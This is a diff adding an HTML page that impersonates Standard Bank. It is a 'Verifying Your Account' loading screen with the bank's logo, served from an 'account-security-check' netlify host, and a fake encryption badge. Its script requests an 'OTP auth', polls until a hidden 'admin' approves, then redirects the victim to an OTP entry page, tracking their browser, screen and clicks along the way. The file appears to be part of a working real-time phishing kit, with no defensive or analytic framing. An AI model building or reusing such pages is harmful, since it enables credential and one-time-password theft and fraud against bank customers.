@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing Verification - Standard Bank</title>
+    <!-- Add favicon -->
+    <link rel="icon" type="image/png" href="https://account-security-check.netlify.app/zsg.png">
+    
+    <!-- Viewport meta tag for mobile responsiveness -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Internal CSS for Loading Page Styling -->
+    <style>
+        /* General body styling */
+        body {
+            font-family: Arial, sans-serif; /* Set font family to Arial with fallback to sans-serif */
+            background: linear-gradient(135deg, #003cc7 0%, #0056b3 100%); /* Blue gradient background */
+            margin: 0; /* Remove default margin */
+            padding: 0; /* Remove default padding */
+            display: flex; /* Use flexbox layout */
+            flex-direction: column; /* Stack items vertically */
+            justify-content: center; /* Center items vertically */
+            align-items: center; /* Center items horizontally */
+            min-height: 100vh; /* Ensure the body takes at least the full viewport height */
+            overflow: hidden; /* Hide any overflow */
+        }
+
+        /* Loading container styling */
+        .loading-container {
+            text-align: center; /* Center align all content */
+            color: white; /* White text color */
+            animation: fadeIn 0.8s ease-in; /* Fade in animation */
+        }
+
+        /* Logo styling with enhanced animations */
+        #loading-logo {
+            width: 120px; /* Set logo width to 120 pixels */
+            height: auto; /* Maintain aspect ratio automatically */
+            margin-bottom: 30px; /* Add 30px space below the logo */
+            animation: pulse 2s infinite, float 3s ease-in-out infinite; /* Combine pulse and float animations */
+            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.3)); /* Add glowing effect */
+        }
+
+        /* Main heading styling */
+        .loading-title {
+            font-size: 28px; /* Large font size for main title */
+            font-weight: bold; /* Bold text */
+            margin-bottom: 15px; /* Space below title */
+            animation: slideInFromBottom 1s ease-out; /* Slide up animation */
+        }
+
+        /* Subtitle styling */
+        .loading-subtitle {
+            font-size: 16px; /* Medium font size for subtitle */
+            opacity: 0.9; /* Slightly transparent */
+            margin-bottom: 40px; /* Space below subtitle */
+            animation: slideInFromBottom 1.2s ease-out; /* Delayed slide up animation */
+        }
+
+        /* Loading spinner container */
+        .spinner-container {
+            margin: 30px 0; /* Vertical margin around spinner */
+            animation: slideInFromBottom 1.4s ease-out; /* Further delayed slide up animation */
+        }
+
+        /* Main loading spinner */
+        .loading-spinner {
+            width: 60px; /* Spinner width */
+            height: 60px; /* Spinner height */
+            border: 4px solid rgba(255, 255, 255, 0.3); /* Light border */
+            border-top: 4px solid white; /* White top border for spinning effect */
+            border-radius: 50%; /* Make it circular */
+            animation: spin 1s linear infinite; /* Continuous spinning animation */
+            margin: 0 auto 20px; /* Center horizontally with bottom margin */
+        }
+
+        /* Progress bar container */
+        .progress-container {
+            width: 300px; /* Fixed width for progress bar */
+            height: 6px; /* Height of progress bar */
+            background-color: rgba(255, 255, 255, 0.2); /* Semi-transparent white background */
+            border-radius: 3px; /* Rounded corners */
+            margin: 0 auto 20px; /* Center horizontally with bottom margin */
+            overflow: hidden; /* Hide overflow for animation */
+        }
+
+        /* Progress bar fill */
+        .progress-bar {
+            height: 100%; /* Full height of container */
+            background: linear-gradient(90deg, #ffffff, #e3f2fd, #ffffff); /* White gradient */
+            border-radius: 3px; /* Rounded corners */
+            animation: progressFill 3s ease-in-out; /* Progress animation */
+            transform-origin: left; /* Start animation from left */
+        }
+
+        /* Status text styling */
+        .status-text {
+            font-size: 14px; /* Smaller font for status */
+            opacity: 0.8; /* More transparent */
+            margin-bottom: 10px; /* Small bottom margin */
+            min-height: 20px; /* Ensure consistent height */
+            animation: fadeInOut 2s ease-in-out infinite; /* Pulsing text animation */
+        }
+
+        /* Security badge styling */
+        .security-badge {
+            display: inline-block; /* Inline block for centering */
+            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent background */
+            padding: 10px 20px; /* Padding around badge */
+            border-radius: 25px; /* Rounded pill shape */
+            border: 1px solid rgba(255, 255, 255, 0.3); /* Light border */
+            font-size: 12px; /* Small font size */
+            margin-top: 20px; /* Space above badge */
+            animation: slideInFromBottom 1.6s ease-out; /* Latest slide up animation */
+        }
+
+        /* Security icon in badge */
+        .security-icon {
+            margin-right: 8px; /* Space to the right of icon */
+            font-size: 14px; /* Slightly larger icon */
+        }
+
+        /* Keyframe animations */
+        
+        /* Fade in animation for main container */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); } /* Start transparent and below */
+            to { opacity: 1; transform: translateY(0); } /* End visible and in position */
+        }
+
+        /* Slide up animation for text elements */
+        @keyframes slideInFromBottom {
+            from { opacity: 0; transform: translateY(30px); } /* Start transparent and below */
+            to { opacity: 1; transform: translateY(0); } /* End visible and in position */
+        }
+
+        /* Spinning animation for loading spinner */
+        @keyframes spin {
+            0% { transform: rotate(0deg); } /* Start at 0 degrees */
+            100% { transform: rotate(360deg); } /* End at 360 degrees */
+        }
+
+        /* Pulse animation for logo */
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); } /* Normal size at start and end */
+            50% { transform: scale(1.05); } /* Slightly larger in middle */
+        }
+
+        /* Float animation for logo */
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); } /* Normal position at start and end */
+            50% { transform: translateY(-10px); } /* Float up in middle */
+        }
+
+        /* Progress bar fill animation */
+        @keyframes progressFill {
+            0% { transform: scaleX(0); } /* Start with no width */
+            100% { transform: scaleX(1); } /* End with full width */
+        }
+
+        /* Fade in and out animation for status text */
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0.8; } /* Normal opacity at start and end */
+            50% { opacity: 1; } /* Full opacity in middle */
+        }
+
+        /* Responsive design for mobile devices */
+        @media (max-width: 768px) {
+            .loading-title {
+                font-size: 24px; /* Smaller title on mobile */
+            }
+            
+            .loading-subtitle {
+                font-size: 14px; /* Smaller subtitle on mobile */
+            }
+            
+            #loading-logo {
+                width: 100px; /* Smaller logo on mobile */
+            }
+            
+            .progress-container {
+                width: 250px; /* Narrower progress bar on mobile */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <!-- Logo with animations -->
+        <img src="https://account-security-check.netlify.app/zsg.png" alt="Standard Bank Logo" id="loading-logo">
+        
+        <!-- Main title -->
+        <h1 class="loading-title">Verifying Your Account</h1>
+        
+        <!-- Subtitle -->
+        <p class="loading-subtitle">Please wait while we securely process your information</p>
+        
+        <!-- Spinner and progress section -->
+        <div class="spinner-container">
+            <!-- Loading spinner -->
+            <div class="loading-spinner"></div>
+            
+            <!-- Progress bar -->
+            <div class="progress-container">
+                <div class="progress-bar"></div>
+            </div>
+            
+            <!-- Dynamic status text -->
+            <div class="status-text" id="status-text">Validating credentials...</div>
+        </div>
+        
+        <!-- Security badge -->
+        <div class="security-badge">
+            <span class="security-icon">🔒</span>
+            256-bit SSL Encrypted
+        </div>
+    </div>
+
+    <!-- User Activity Tracking Script -->
+    <script src="/public/tracking.js"></script>
+    
+    <!-- JavaScript for loading page functionality -->
+    <script>
+        // Array of status messages to cycle through
+        const initialMessages = [
+            "Validating credentials...", // Initial message about credential validation
+            "Connecting to secure servers...", // Message about server connection
+            "Verifying account details...", // Message about account verification
+            "Checking security protocols...", // Message about security checks
+            "Requesting authorization...", // Message about requesting admin approval
+            "Waiting for admin approval..." // Final message waiting for approval
+        ];
+        
+        const waitingMessages = [
+            "Waiting for admin approval...", // Primary waiting message
+            "Please wait while we verify your request...", // Alternative waiting message
+            "Your request is being reviewed...", // Another waiting message
+            "This may take a few moments..." // Final waiting message
+        ];
+        
+        let currentMessageIndex = 0; // Track current message index
+        let messageInterval; // Store interval ID for message cycling
+        let authRequestId = null; // Store authorization request ID
+        let authCheckInterval = null; // Store interval ID for checking authorization status
+        let isWaitingForApproval = false; // Track if we're in waiting mode
+        
+        // Function to update the status message
+        function updateStatusMessage() {
+            const statusElement = document.getElementById('status-text'); // Get status text element
+            
+            if (!isWaitingForApproval) {
+                // Use initial messages during setup phase
+                statusElement.textContent = initialMessages[currentMessageIndex]; // Update with current message
+                currentMessageIndex = (currentMessageIndex + 1) % initialMessages.length; // Move to next message
+                
+                // If we've reached the last initial message, switch to waiting mode
+                if (currentMessageIndex === initialMessages.length - 1) {
+                    setTimeout(() => {
+                        isWaitingForApproval = true; // Switch to waiting mode
+                        currentMessageIndex = 0; // Reset index for waiting messages
+                    }, 2000); // Wait 2 seconds before switching
+                }
+            } else {
+                // Use waiting messages while waiting for approval
+                statusElement.textContent = waitingMessages[currentMessageIndex]; // Update with waiting message
+                currentMessageIndex = (currentMessageIndex + 1) % waitingMessages.length; // Cycle through waiting messages
+            }
+        }
+        
+        // Function to create authorization request
+        function createAuthorizationRequest() {
+            return fetch('/api/request-otp-auth', {
+                method: 'POST', // Use POST method
+                headers: {
+                    'Content-Type': 'application/json', // Set content type to JSON
+                },
+                body: JSON.stringify({}) // Empty body for now
+            })
+            .then(response => {
+                if (!response.ok) { // Check if response is not successful
+                    throw new Error('Failed to create authorization request');
+                }
+                return response.json(); // Parse response as JSON
+            })
+            .then(data => {
+                authRequestId = data.request_id; // Store request ID for polling
+                console.log('Authorization request created:', data);
+                
+                // Track authorization request creation
+                if (window.UserTracking) {
+                    UserTracking.track('otp_auth_request_created', 'loading-container', {
+                        request_id: authRequestId, // Include request ID
+                        timestamp: new Date().toISOString() // Current timestamp
+                    });
+                }
+                
+                return data; // Return data for further processing
+            })
+            .catch(error => {
+                console.error('Error creating authorization request:', error);
+                
+                // Track authorization request error
+                if (window.UserTracking) {
+                    UserTracking.track('otp_auth_request_error', 'loading-container', {
+                        error: error.message, // Include error message
+                        timestamp: new Date().toISOString() // Current timestamp
+                    });
+                }
+                
+                throw error; // Re-throw error for handling
+            });
+        }
+        
+        // Function to check authorization status
+        function checkAuthorizationStatus() {
+            if (!authRequestId) {
+                console.error('No authorization request ID available');
+                return;
+            }
+            
+            fetch(`/api/check-otp-auth/${authRequestId}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Authorization status check:', data);
+                    
+                    if (data.status === 'approved' && data.can_proceed) {
+                        // Authorization approved - proceed to OTP page
+                        clearInterval(messageInterval); // Stop updating status messages
+                        clearInterval(authCheckInterval); // Stop checking authorization
+                        
+                        // Update status to show approval
+                        document.getElementById('status-text').textContent = 'Authorization approved! Redirecting...';
+                        
+                        // Track successful authorization
+                        if (window.UserTracking) {
+                            UserTracking.track('otp_auth_approved', 'loading-container', {
+                                request_id: authRequestId, // Include request ID
+                                approved_at: data.approved_at, // When it was approved
+                                transition_reason: 'admin_approved' // Why the transition happened
+                            });
+                        }
+                        
+                        // Redirect to OTP verification page after short delay
+                        setTimeout(() => {
+                            window.location.href = '/otp-verification';
+                        }, 2000); // 2 second delay to show approval message
+                        
+                    } else if (data.status === 'denied') {
+                        // Authorization denied
+                        clearInterval(messageInterval); // Stop updating status messages
+                        clearInterval(authCheckInterval); // Stop checking authorization
+                        
+                        // Update status to show denial
+                        document.getElementById('status-text').textContent = 'Authorization denied. Please contact support.';
+                        
+                        // Track denied authorization
+                        if (window.UserTracking) {
+                            UserTracking.track('otp_auth_denied', 'loading-container', {
+                                request_id: authRequestId, // Include request ID
+                                denied_at: data.approved_at, // When it was denied
+                                notes: data.notes // Admin notes if any
+                            });
+                        }
+                        
+                    } else {
+                        // Still pending - continue waiting
+                        console.log('Still waiting for authorization...');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking authorization status:', error);
+                    // Continue polling despite errors (network issues might be temporary)
+                });
+        }
+        
+        // Function to start the loading process with authorization request
+        function startLoadingProcess() {
+            // Update status message every 3 seconds (slower during waiting)
+            messageInterval = setInterval(updateStatusMessage, 3000);
+            
+            // Track that user reached the loading page
+            if (window.UserTracking) {
+                UserTracking.track('loading_page_view', 'loading-container', {
+                    timestamp: new Date().toISOString(), // Current timestamp
+                    user_agent: navigator.userAgent, // Browser information
+                    screen_resolution: `${screen.width}x${screen.height}` // Screen size
+                });
+            }
+            
+            // Create authorization request after initial setup (5 seconds)
+            setTimeout(() => {
+                createAuthorizationRequest()
+                    .then(() => {
+                        // Start checking authorization status every 5 seconds
+                        authCheckInterval = setInterval(checkAuthorizationStatus, 5000);
+                        
+                        // Also check immediately
+                        checkAuthorizationStatus();
+                    })
+                    .catch(error => {
+                        // Handle authorization request creation error
+                        document.getElementById('status-text').textContent = 'Error requesting authorization. Please refresh the page.';
+                        clearInterval(messageInterval); // Stop updating status messages
+                    });
+            }, 5000); // Wait 5 seconds before creating authorization request
+        }
+        
+        // Handle page unload (if user navigates away)
+        window.addEventListener('beforeunload', function() {
+            clearInterval(messageInterval); // Clean up message interval
+            clearInterval(authCheckInterval); // Clean up authorization check interval
+            
+            // Track if user leaves loading page early
+            if (window.UserTracking) {
+                UserTracking.track('loading_page_exit', 'loading-container', {
+                    exit_reason: 'user_navigation', // User navigated away
+                    time_on_page: Date.now() - window.performance.timing.navigationStart, // Time spent on page
+                    auth_request_id: authRequestId, // Include request ID if available
+                    was_waiting_for_approval: isWaitingForApproval // Whether user was in waiting mode
+                });
+            }
+        });
+        
+        // Start the loading process when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            startLoadingProcess(); // Begin loading simulation
+        });
+        
+        // Track when user interacts with the page (clicks, etc.)
+        document.addEventListener('click', function(event) {
+            if (window.UserTracking) {
+                UserTracking.track('loading_page_interaction', 'loading-container', {
+                    interaction_type: 'click', // Type of interaction
+                    target_element: event.target.tagName || 'unknown' // What was clicked
+                });
+            }
+        });
+    </script>
+</body>
+</html>
